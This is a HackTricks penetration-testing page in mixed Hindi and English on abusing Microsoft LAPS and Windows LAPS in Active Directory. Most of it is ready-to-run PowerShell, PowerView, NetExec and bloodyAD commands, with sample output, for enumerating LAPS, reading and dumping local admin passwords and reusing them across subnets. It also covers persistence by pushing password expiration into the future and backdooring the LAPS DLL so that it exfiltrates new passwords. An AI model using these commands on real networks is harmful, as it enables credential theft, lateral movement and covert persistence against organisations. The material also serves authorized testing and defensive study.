# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

अभी assessment के दौरान आपको **2 LAPS flavours** मिल सकते हैं:

- **Legacy Microsoft LAPS**: local administrator password को **`ms-Mcs-AdmPwd`** में और expiration time को **`ms-Mcs-AdmPwdExpirationTime`** में store करता है।
- **Windows LAPS** (April 2023 updates के बाद से Windows में built-in): अभी भी legacy mode emulate कर सकता है, लेकिन native mode में यह **`msLAPS-*`** attributes use करता है, **password encryption**, **password history**, और domain controllers के लिए **DSRM password backup** support करता है।

LAPS का design **local administrator passwords** manage करने के लिए किया गया है, जिससे वे **unique, randomized, and frequently changed** हों domain-joined computers पर। अगर आप उन attributes को read कर सकते हैं, तो आप usually affected host पर **local admin के रूप में pivot** कर सकते हैं। कई environments में, interesting part सिर्फ password itself पढ़ना नहीं होता, बल्कि यह भी पता लगाना होता है कि password attributes तक access **किसे delegate** किया गया था।

### Legacy Microsoft LAPS attributes

domain के computer objects में, legacy Microsoft LAPS implementation दो attributes add करता है:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS computer objects में कई नए attributes add करता है:

- **`msLAPS-Password`**: clear-text password blob जो encryption enabled न होने पर JSON के रूप में stored होता है
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers के लिए encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking, जो newer rollback-detection logic में use होता है (Windows Server 2025 forest schema)

जब **`msLAPS-Password`** readable होता है, तो value एक JSON object होती है जिसमें account name, update time और clear-text password शामिल होते हैं, उदाहरण के लिए:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### जांचें कि सक्रिय है या नहीं
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

आप **raw LAPS policy** को `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` से **download** कर सकते हैं और फिर इस file को human-readable format में convert करने के लिए [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package से **`Parse-PolFile`** का use कर सकते हैं।

### Legacy Microsoft LAPS PowerShell cmdlets

अगर legacy LAPS module installed है, तो आमतौर पर निम्न cmdlets available होते हैं:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS एक नए PowerShell module और नए cmdlets के साथ आता है:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
कुछ ऑपरेशनल विवरण यहाँ महत्वपूर्ण हैं:

- **`Get-LapsADPassword`** स्वतः **legacy LAPS**, **clear-text Windows LAPS**, और **encrypted Windows LAPS** को हैंडल करता है।
- अगर password encrypted है और आप उसे **read** कर सकते हैं लेकिन **decrypt** नहीं कर सकते, तो cmdlet **`Source`**, **`DecryptionStatus`**, और **`AuthorizedDecryptor`** जैसी metadata लौटाता है, भले ही वह clear-text password वापस न कर सके।
- **encrypted Windows LAPS** में, **read permission** और **decrypt permission** अलग-अलग controls हैं। OU / object read access होने का मतलब यह नहीं कि आप automatically **`msLAPS-EncryptedPassword`** को decrypt कर सकते हैं।
- **Password history** केवल तब उपलब्ध होती है जब **Windows LAPS encryption** enabled हो।
- domain controllers पर, returned source **`EncryptedDSRMPassword`** हो सकता है।

यह assessment के दौरान उपयोगी है क्योंकि **`AuthorizedDecryptor`** field बताती है कि blob किस user या group के लिए encrypt किया गया था, जिससे अक्सर failed password read एक नए privilege-escalation target में बदल जाता है।

### PowerView / LDAP

**PowerView** का उपयोग यह पता लगाने के लिए भी किया जा सकता है कि **कौन password read कर सकता है और उसे read कर सकता है**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
यदि **`msLAPS-Password`** readable है, तो returned JSON को parse करें और password के लिए **`p`** तथा managed local admin account name के लिए **`n`** extract करें।
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
वह **`n`** फ़ील्ड नए deployments पर महत्वपूर्ण है क्योंकि **Windows LAPS automatic account management** एक **custom account** को target कर सकती है, built-in **`Administrator`** के बजाय, और नए **Windows 11 24H2 / Windows Server 2025** systems उस account name को **randomize** भी कर सकते हैं।

### Linux / remote tooling

Modern tooling legacy Microsoft LAPS और Windows LAPS दोनों को support करता है।
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** अभी भी Linux से **legacy Microsoft LAPS** के लिए उपयोगी है, लेकिन यह केवल **`ms-Mcs-AdmPwd`** को target करता है।
- **`LAPS4LINUX`**, **`dpapi-ng`**-based tooling, और recent **NetExec** workflows जैसे newer cross-platform tooling non-Windows hosts से **native Windows LAPS** को भी handle कर सकते हैं।
- अगर environment **encrypted Windows LAPS** इस्तेमाल करता है, तो एक simple LDAP read काफी नहीं है; आपको **authorized decryptor** भी होना चाहिए (या equivalent decryption material, जैसे offline domain DPAPI-NG root key material)।
- **Windows 11 24H2 / Windows Server 2025** पर, यह assume न करें कि managed local admin हमेशा **`Administrator`** होता है। Automatic account management एक custom account बना सकता है और optionally उसका नाम randomize कर सकता है, इसलिए scale पर **`--laps`** use करने से पहले **`n`** / **`Account`** के जरिए account name पहले discover करें।

### Directory synchronization abuse

अगर आपके पास हर computer object पर direct read access के बजाय domain-level **directory synchronization** rights हैं, तो भी LAPS interesting हो सकता है।

**`DS-Replication-Get-Changes`** का combination **`DS-Replication-Get-Changes-In-Filtered-Set`** या **`DS-Replication-Get-Changes-All`** के साथ **confidential / RODC-filtered** attributes जैसे legacy **`ms-Mcs-AdmPwd`** को synchronize करने के लिए use किया जा सकता है। BloodHound इसे **`SyncLAPSPassword`** के रूप में model करता है। Replication-rights background के लिए [DCSync](dcsync.md) देखें।

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) कई functions के साथ LAPS की enumeration को आसान बनाता है।\
एक function **LAPS enabled** सभी computers के लिए **`ExtendedRights`** को parse करना है। इससे वे **groups** दिखते हैं जिन्हें specifically **LAPS passwords read** करने के लिए delegate किया गया है, जो अक्सर protected groups में users होते हैं।\
एक **account** जिसने किसी computer को domain में **join** किया है, उसे उस host पर `All Extended Rights` मिलते हैं, और यह right उस **account** को **passwords read** करने की क्षमता देता है। Enumeration से एक user account मिल सकता है जो किसी host पर LAPS password read कर सकता है। इससे हमें ऐसे specific AD users को target करने में मदद मिल सकती है जो LAPS passwords read कर सकते हैं।
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec के साथ LAPS Passwords डंप करना

यदि आपके पास interactive PowerShell नहीं है, तो आप इस privilege का abuse LDAP के जरिए remotely कर सकते हैं:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
यह उन सभी LAPS secrets को dump करता है जिन्हें user पढ़ सकता है, जिससे आप अलग local administrator password के साथ laterally move कर सकते हैं।

## LAPS Password का उपयोग करना
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### समाप्ति तिथि

एक बार admin होने पर, **passwords प्राप्त करना** और किसी machine को उसका **password** **अपडेट** करने से **रोकना** संभव है, इसके लिए **expiration date को future में सेट** किया जाता है।

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS **`msLAPS-PasswordExpirationTime`** का उपयोग करता है:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> पासवर्ड फिर भी rotate होगा अगर कोई **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** इस्तेमाल करता है, या अगर **Do not allow password expiration time longer than required by policy** enabled है।

### नए Windows LAPS पर Snapshot rollback caveat

पुराने snapshot / image rollback tricks हाल के **Windows LAPS** deployments के खिलाफ **कम reliable** हैं। **Windows 11 24H2 / Windows Server 2025** पर, अगर forest schema में **`msLAPS-CurrentPasswordVersion`** शामिल है (**Windows Server 2025 forest schema**), तो client locally cached GUID को AD में stored value से compare करता है और rollback से **torn state** बनने पर **immediately rotate the password** करता है।

Practical तौर पर, इसका मतलब है कि snapshot-based persistence या पुराने known local admin password को वापस लाने की कोशिशें अगले normal expiration तक survive करने के बजाय जल्दी fail हो सकती हैं।

यह protection सिर्फ **AD-backed Windows LAPS** पर लागू होती है और फिर भी इस बात पर depend करती है कि reverted machine **AD के साथ authenticate** कर सके। अगर machine अब AD से बात नहीं कर सकती, तो **password history** या **AD backup access** फिर भी काम आ सकता है।

### Automatic account management tamper caveat

जब **automatic account management** enabled होता है, Windows LAPS managed local admin account की lifecycle own करता है। उस account को rename, reconfigure, या किसी और तरह tamper करने की unexpected कोशिशें **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** के साथ reject हो सकती हैं, इसलिए persistence जो managed LAPS account को quietly modify करने पर depend करती है, नए endpoints पर कम reliable होती है।

### AD backups से historical passwords recover करना

जब **Windows LAPS encryption + password history** enabled होता है, mounted AD backups secrets का एक additional source बन सकते हैं। अगर आप mounted AD snapshot access कर सकते हैं और **recovery mode** use कर सकते हैं, तो आप live DC से बात किए बिना पुराने stored passwords query कर सकते हैं।
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
यह ज्यादातर **AD backup theft**, **offline forensics abuse**, या **disaster-recovery media access** के दौरान relevant होता है।

### Backdoor

legacy Microsoft LAPS के लिए original source code [here](https://github.com/GreyCorbel/admpwd) पाया जा सकता है, इसलिए code में backdoor डालना संभव है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` method के अंदर) जो somehow **नए passwords exfiltrate** कर दे या उन्हें कहीं store कर दे।

फिर, नया `AdmPwd.PS.dll` compile करें और उसे machine पर `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` में upload करें (और modification time बदल दें)।

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
